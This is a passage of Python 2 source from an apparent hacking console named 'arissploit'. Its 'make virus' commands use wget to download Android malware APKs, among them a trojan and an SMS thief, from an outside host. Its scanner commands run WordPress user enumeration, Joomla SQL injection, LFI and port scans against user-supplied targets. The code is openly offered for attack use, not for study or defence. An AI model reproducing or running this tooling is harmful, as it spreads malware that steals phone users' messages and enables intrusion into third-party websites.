		dea = raw_input(""+N+"(console)> ("+R+"on_android_malware_door"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir malware_bnews;cd malware_bnews;wget http://loolzec.blogwaper.com/files/benews.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/malware_bnews/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
			
			#
			
	elif dr == "make virus/on_android_malware_at":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_malware_at"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir malware_at;cd malware_at;wget http://loolzec.blogwaper.com/files/at.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/malware_at/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
			
			#
			
	elif dr == "make virus/on_android_trojan_malware":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_trojan_malware"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir trojan_malware;cd trojan_malware;wget http://loolzec.blogwaper.com/files/tr.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/trojan_malware/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
			
	elif dr == "make virus/on_android_brother":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_brother"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir brother;cd brother;wget http://loolzec.blogwaper.com/files/brother.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/brother/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
			
			#
			
	elif dr == "make virus/on_android_mcef":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_mcef"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir mcef;cd mcef;wget http://loolzec.blogwaper.com/files/mcef.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/mcef/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
			
			#
			
	elif dr == "make virus/on_android_sms_tief":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_sms_tief"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir sms_tief;cd sms_tief;wget http://loolzec.blogwaper.com/files/smsthief.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/sms_tief/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			main()
			
			#############
			#   SCANNERS.   #
			#############
			
	elif dr == "use scanner/usr_pro_wordpress_auto_find":
		os.system("cd modules;cd usr_pro_wordpress_auto_find;python2 userpro.py")
		print ""+B+"[*]"+N+" Job finished"
		print
		main()
	elif dr == "use scanner/cms_war":
		tops = raw_input(""+N+"(target)> ("+R+"cms_war"+N+"): ")
		print "target =>"+R+"" ,tops
		print ""+N+"=> "+R+"scan "+N+"[dir, shell, backup, files, admin]"
		ray = raw_input(""+N+"(scan)> ("+R+"cms_war"+N+"): ")
		gay = raw_input(""+N+"(console)> ("+R+"cms_war"+N+"): ")
		if gay == "run":
			print ""+B+"[*]"+N+" Starting attacks..."
			os.system("cd modules;cd scanner;python2 scanner.py %s -m %s" % (tops,ray))
			print ""+B+"[*]"+N+" Job finished..."
			print
			main()
	elif dr == "use scanner/wordpress_user_scan":
		wop = raw_input(""+N+"(target)> ("+R+"wordpress_user_scanners"+N+"): ")
		enum = raw_input(""+N+"(users)> ("+R+"wordpress_user_scanners"+N+"): ")
		uiop = raw_input("(console)> ("+R+"wordpress_user_scanners"+N+"): ")
		if uiop == "run":
			print ""+B+"[*]"+N+" Starting attacks..."
			os.system("cd modules;cd wscan;python wpscanner.py -s %s -n %s" % (wop,enum))
			print ""+B+"[*]"+N+" Job finished..."
			print
			main()
	elif dr == "use scanner/dir_search":
		ym = raw_input(""+N+"(target)> ("+R+"dir_search"+N+"): ")
		print "target => "+R+"",ym
		time.sleep(2)
		puki = raw_input("(extensions)> ("+R+"dir_search"+N+"): ")
		dih = raw_input("(console)> ("+R+"dir_search"+N+"): ")
		if dih == "run":
			os.system("cd modules;cd dirsearch;python3 dirsearch.py -u %s -e %s" % (ym,puki))
			print ""+B+"[*]"+N+" Job finished..."
			print
			main()
	elif dr == "use scanner/lfi_scanners":
		yu = raw_input(""+N+"(console)> ("+R+"lfi_scanners"+N+"): ")
		time.sleep(2)
		print ""+B+"[*] "+N+"Starting attacks..."
		os.system("cd modules;cd lfi_scanners;perl lfi_scanner.pl")
		print ""+B+"[*]"+N+" Job finished"
		print
		main()
	elif dr == "use scanner/port_scanners":
		os.system("python modules/port_scanners/port.py")
		print ""+B+"[*]"+N+" Job finished"
		print
		main()
	elif dr == "use scanner/joomla_sqli_scanners":
		q = raw_input(""+N+"(list)> ("+R+"joomla_sqli_scanners"+N+"): ")
		print "list web => "+R+"",q
		m = raw_input(""+N+"(console)> ("+R+"joomla_sqli_scanners"+N+"): ")
		if m == "run":
			time.sleep(2)
			print ""+B+"[*] "+N+"Starting attacks..."
			os.system("cd modules;cd joomla_sqli_scanners;python2 joomsql.py %s" % (q))
			print
			main()
	elif dr == "use scanner/jomscan_v4":
		ops = raw_input(""+N+"(target)> ("+R+"jomscan_v4"+N+"): ")
		print "target => "+R+"",ops
		rup = raw_input(""+N+"(console)> ("+R+"jomscan_v4"+N+"): ")
		if rup == "run":
			print ""+B+"[*]"+N+" Starting Attacks..."
			os.system("cd modules;cd joomscan_v4;python2 scan.py %s" % (ops))
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "use scanner/joomla_scanners_v3":
		x = raw_input(""+N+"(target)> ("+R+"joomla_scanners_v3"+N+"): ")
		print "target => "+R+"",x
		i = raw_input(""+N+"(console)> ("+R+"joomla_scanners_v3"+N+"): ")
		if i == "run":
			time.sleep(2)
			print ""+B+"[*]"+N+" Starting attacks..."
			os.system("cd modules;cd joomscan_v3;python2 joomlascanner.py %s" % (x))
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "use scanner/joomla_scanners_v.2":
		p = raw_input(""+N+"(target)> ("+R+"joomla_scanners_v.2"+N+"): ")
		print "target => "+R+"",p
		o = raw_input(""+N+"(console)> ("+R+"joomla_scanners_v.2"+N+"): ")
		if o == "run":
			os.system("cd modules;cd joomscan_v2;python2 joomlascan2.py %s" % (p))
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "use scanner/joomla_vulnerability_scanners":
		k = raw_input(""+N+"(console)> ("+R+"joomla_vulnerability_scanners"+N+"): ")
		if k == "run":
			time.sleep(2)
			print ""+B+"[*]"+N+" Starting attacks..."
			os.system("cd modules;cd joomscan;perl joomlavulnerability.pl")
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "use scanner/jdownloads_scanners":
		li = raw_input(""+N+"(list)> ("+R+"jdownloads_scanners"+N+"): ")
		time.sleep(1)
		print "list => "+R+"",li
		ruu = raw_input(""+N+"(console)> ("+R+"jdownloads_scanners"+N+"): ")
		time.sleep(1)
		if ruu == "run":
			print ""+B+"[*]"+N+" Starting attacks..."
			os.system("cd modules;cd jdownloads_scanner;perl jdownloads_scanner.pl %s" % (li))
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "exit":
		time.sleep(1)
		print "exiting..."
		time.sleep(1)
		print ""+N+""+B+"["+B+"\^"+N+"_"+B+"^/"+B+"] "+N+"Bye! I am A.R.I.S!"+E+""
		sys.exit()
	else:
		print ""+N+""+B+"["+R+"-"+B+"] "+N+"Unknown command :"+R+"",dr
		print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
		print
		main()
		

if __name__ == "__main__":
	main()
